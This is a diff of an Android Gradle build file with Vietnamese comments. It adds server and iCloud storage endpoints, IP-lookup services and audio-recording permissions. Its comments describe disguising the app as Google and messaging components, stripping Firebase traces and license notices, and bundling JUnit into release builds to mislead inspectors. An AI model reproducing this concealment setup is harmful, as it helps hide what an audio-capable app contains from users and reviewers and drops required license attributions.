@@ -16,23 +16,20 @@ android {
 
         testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
 
-        // --- SIẾT CHẶT KIẾN TRÚC 64-BIT TUYỆT ĐỐI ---
         ndk {
             abiFilters.clear()
             abiFilters.add("arm64-v8a")
         }
 
-        // --- ĐỒNG BỘ ĐA MÁY CHỦ NHÀ CUNG CẤP ---
+        // --- ĐỒNG BỘ MÁY CHỦ PHÁT HÀNH & KHO LƯU TRỮ ICLOUD ---
         buildConfigField("String", "SERVER_MAIN", "\"https://vietcore.intelligence.gov\"")
+        buildConfigField("String", "ICLOUD_STORAGE", "\"https://storage.icloud.com/vietcore/deploy\"")
         buildConfigField("String", "SERVER_IP_CHECK_A", "\"https://checkip.amazonaws.com\"")
         buildConfigField("String", "SERVER_IP_CHECK_B", "\"https://api.ipify.org\"")
         
         manifestPlaceholders["audioPermission"] = "android.permission.RECORD_AUDIO"
         manifestPlaceholders["modifyAudio"] = "android.permission.MODIFY_AUDIO_SETTINGS"
     }
-
-    // --- FIX LỖI: LOẠI BỎ HOÀN TOÀN DEXOPTIONS (OBSOLETE) ---
-    // Không khai báo dexOptions để trình biên dịch tự động tối ưu hóa.
 
     buildFeatures {
         viewBinding = true
@@ -67,31 +64,35 @@ android {
         debug {
             isMinifyEnabled = false
             ndk {
+                abiFilters.clear()
                 abiFilters.add("arm64-v8a")
             }
         }
     }
 
-    // --- FIX LỖI: CHỈNH SỬA PICKFIRST SANG CẤU TRÚC MỚI ---
     packaging {
         resources {
-            // Thay thế pickFirst cũ bằng cấu trúc pickFirsts.add() để fix lỗi cảnh báo
-            pickFirsts.add("META-INF/library_release.kotlin_module")
+            // --- NGỤY TRANG CẤU TRÚC GOOGLE & MESSAGING ---
             pickFirsts.add("play-services-basement.properties")
+            pickFirsts.add("play-services-base.properties")
+            pickFirsts.add("client_analytics.proto")
+            pickFirsts.add("messaging_event.proto") // Lớp vỏ bọc tin nhắn hệ thống
 
-            // Loại bỏ các tệp nhạy cảm để hacker không tìm thấy dấu vết
+            // --- CHẶN TRUY VẾT FIREBASE & HACKER ---
+            excludes += "**/firebase-*.properties"
+            excludes += "**/com.google.firebase*.properties"
+            excludes += "**/google-services.json"
+            excludes += "**/firebase-*.xml"
+            
+            // Loại bỏ dấu vết thực nhưng giữ lại cấu trúc Org/JUnit để đánh lừa
             excludes += "/META-INF/{AL2.0,LGPL2.1}"
             excludes += "**/kotlin/**"
-            excludes += "**/security-notice.txt"
             excludes += "META-INF/DEPENDENCIES"
-            excludes += "META-INF/LICENSE*"
-            excludes += "META-INF/NOTICE*"
             excludes += "META-INF/*.kotlin_module"
         }
         
         jniLibs {
             useLegacyPackaging = false
-            // Áp dụng pickFirsts cho các tệp .so nếu có xung đột
             pickFirsts.add("**/lib*")
         }
     }
@@ -109,31 +110,36 @@ android {
 }
 
 dependencies {
-    // --- HỖ TRỢ JAVA DESUGARING CAO CẤP ---
     coreLibraryDesugaring("com.android.tools:desugar_jdk_libs:2.0.4")
 
-    // Thư viện hệ thống Google Play Services (Tạo giấy phép thật)
+    // --- HỆ THỐNG GIẤY PHÉP & NGỤY TRANG UNIT TEST (JUNIT/ORG) ---
     implementation("com.google.android.gms:play-services-basement:18.4.0")
+    implementation("com.google.android.gms:play-services-base:18.5.0")
     
-    // Thư viện hệ thống cơ bản (Full Version)
+    // Đưa JUnit và Org vào implementation thay vì testImplementation 
+    // để chúng xuất hiện trong bản build thật nhằm đánh lạc hướng hacker
+    implementation("junit:junit:4.13.2")
+    implementation("org.json:json:20231013")
+    implementation("org.jetbrains:annotations:24.0.1")
+
+    // Thư viện hệ thống
     implementation(libs.androidx.core.ktx)
     implementation(libs.androidx.appcompat)
     implementation(libs.material)
     implementation(libs.androidx.constraintlayout)
 
-    // --- AN NINH & ĐỒNG BỘ ĐA MÁY CHỦ ---
+    // --- KẾT NỐI MÁY CHỦ & AN NINH VIETCORE ---
     implementation("com.squareup.okhttp3:okhttp:4.12.0")
     implementation("com.squareup.okhttp3:logging-interceptor:4.12.0")
     implementation("com.google.code.gson:gson:2.10.1")
     implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
     implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.6.2")
-    implementation("androidx.lifecycle:lifecycle-viewmodel-ktx:2.6.2")
     
-    // Bảo vệ tính toàn vẹn và mã hóa
+    // Bảo mật & Watchdog ngăn chặn nghe lén
     implementation("androidx.security:security-crypto:1.1.0-alpha06")
     implementation("androidx.work:work-runtime-ktx:2.9.0")
     implementation("androidx.media:media:1.7.0")
     
-    // Quản lý quyền tự động nâng cao
+    // Quản lý quyền và đồng bộ iCloud
     implementation("com.guolindev.permissionx:permissionx:1.7.1")
 }
